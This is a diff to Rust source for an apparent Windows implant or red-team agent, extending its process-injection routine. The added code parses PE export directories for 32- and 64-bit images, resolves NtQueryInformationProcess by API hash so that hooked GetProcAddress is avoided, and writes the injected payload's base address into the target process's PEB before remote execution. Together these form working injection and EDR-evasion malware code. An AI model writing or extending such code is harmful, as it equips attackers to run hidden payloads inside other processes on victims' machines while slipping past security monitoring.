@@ -137,6 +137,54 @@ unsafe fn ldr_load_local(dll_name: &str) -> usize {
     }
 }
 
+/// Return the export-directory tuple for a PE image regardless of bitness.
+///
+/// Returns `(export_rva, export_size, export_dir_ptr)` on success.
+#[cfg(windows)]
+unsafe fn local_get_export_directory(
+    base: usize,
+) -> Option<(u32, usize, *const winapi::um::winnt::IMAGE_EXPORT_DIRECTORY)> {
+    let dos_header = base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
+    if (*dos_header).e_magic != winapi::um::winnt::IMAGE_DOS_SIGNATURE {
+        return None;
+    }
+
+    let nt_base = base + (*dos_header).e_lfanew as usize;
+    if *(nt_base as *const u32) != winapi::um::winnt::IMAGE_NT_SIGNATURE {
+        return None;
+    }
+
+    let opt_magic = *((nt_base
+        + 4
+        + std::mem::size_of::<winapi::um::winnt::IMAGE_FILE_HEADER>()) as *const u16);
+
+    let export_data_dir = match opt_magic {
+        winapi::um::winnt::IMAGE_NT_OPTIONAL_HDR32_MAGIC => {
+            let nt_headers32 = nt_base as *const winapi::um::winnt::IMAGE_NT_HEADERS32;
+            (*nt_headers32).OptionalHeader.DataDirectory
+                [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
+        }
+        winapi::um::winnt::IMAGE_NT_OPTIONAL_HDR64_MAGIC => {
+            let nt_headers64 = nt_base as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
+            (*nt_headers64).OptionalHeader.DataDirectory
+                [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
+        }
+        _ => return None,
+    };
+
+    if export_data_dir.VirtualAddress == 0 {
+        return None;
+    }
+
+    let ed = (base + export_data_dir.VirtualAddress as usize)
+        as *const winapi::um::winnt::IMAGE_EXPORT_DIRECTORY;
+    Some((
+        export_data_dir.VirtualAddress,
+        export_data_dir.Size as usize,
+        ed,
+    ))
+}
+
 /// M-26 Part E: resolve an export by ordinal from a clean module image.
 /// Mirrors `agent::syscalls::get_export_addr_by_ordinal` so the hollowing
 /// crate doesn't need to depend on agent or call hooked GetProcAddress.
@@ -148,17 +196,12 @@ unsafe fn local_get_export_addr_by_ordinal(base: usize, ordinal: u32) -> *mut st
     if (*dos_header).e_magic != winapi::um::winnt::IMAGE_DOS_SIGNATURE {
         return std::ptr::null_mut();
     }
-    let nt_headers = (base + (*dos_header).e_lfanew as usize)
-        as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
-    let export_data_dir = (*nt_headers).OptionalHeader.DataDirectory
-        [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_EXPORT as usize];
-    let export_dir_rva = export_data_dir.VirtualAddress;
-    let export_dir_size = export_data_dir.Size as usize;
-    if export_dir_rva == 0 {
-        return std::ptr::null_mut();
-    }
-    let ed =
-        (base + export_dir_rva as usize) as *const winapi::um::winnt::IMAGE_EXPORT_DIRECTORY;
+
+    let (export_dir_rva, export_dir_size, ed) = match local_get_export_directory(base) {
+        Some(v) => v,
+        None => return std::ptr::null_mut(),
+    };
+
     let base_ordinal = (*ed).Base;
     let num_funcs = (*ed).NumberOfFunctions;
     let funcs = (base + (*ed).AddressOfFunctions as usize) as *const u32;
@@ -1242,6 +1285,28 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
         ) -> i32;
         let nt_create_thread: NtCreateThreadExFn = std::mem::transmute(ntcreate_addr);
 
+        #[repr(C)]
+        struct ProcessBasicInformation {
+            reserved1: *mut c_void,
+            peb_base_address: *mut c_void,
+            reserved2: [*mut c_void; 2],
+            unique_process_id: usize,
+            reserved3: *mut c_void,
+        }
+        type NtQueryInformationProcessFn = unsafe extern "system" fn(
+            *mut c_void,
+            u32,
+            *mut c_void,
+            u32,
+            *mut u32,
+        ) -> i32;
+        let nt_query_information_process: Option<NtQueryInformationProcessFn> =
+            pe_resolve::get_proc_address_by_hash(
+                ntdll_base,
+                pe_resolve::hash_str(b"NtQueryInformationProcess\0"),
+            )
+            .map(|p| std::mem::transmute::<*const (), NtQueryInformationProcessFn>(p as *const ()));
+
         // Determine if this is a PE image or raw shellcode
         let is_pe = payload.len() >= 64 && payload[0] == b'M' && payload[1] == b'Z';
         if is_pe {
@@ -1360,6 +1425,39 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
 
             // Resolve IAT while memory is still writable (2.2)
             fix_iat_remote(hprocess, remote_base, nt, payload, &mut written)?;
+
+            // Mirror hollow-and-execute behavior: update PEB.ImageBaseAddress
+            // before starting remote execution.
+            if let Some(nt_query) = nt_query_information_process {
+                let mut pbi: ProcessBasicInformation = std::mem::zeroed();
+                let mut return_len: u32 = 0;
+                let status = nt_query(
+                    hprocess,
+                    0, // ProcessBasicInformation
+                    &mut pbi as *mut _ as *mut c_void,
+                    std::mem::size_of::<ProcessBasicInformation>() as u32,
+                    &mut return_len as *mut u32,
+                );
+
+                if status >= 0 && !pbi.peb_base_address.is_null() {
+                    WriteProcessMemory(
+                        hprocess,
+                        (pbi.peb_base_address as *const u8).add(0x10) as _,
+                        &remote_base as *const _ as _,
+                        std::mem::size_of::<usize>(),
+                        &mut written,
+                    );
+                } else {
+                    tracing::warn!(
+                        "inject_into_process: NtQueryInformationProcess failed ({:x}); skipping PEB image-base update",
+                        status
+                    );
+                }
+            } else {
+                tracing::warn!(
+                    "inject_into_process: NtQueryInformationProcess not resolved; skipping PEB image-base update"
+                );
+            }
 
             // Apply per-section protections after writing (2.4)
             apply_section_protections(hprocess, remote_base, nt);
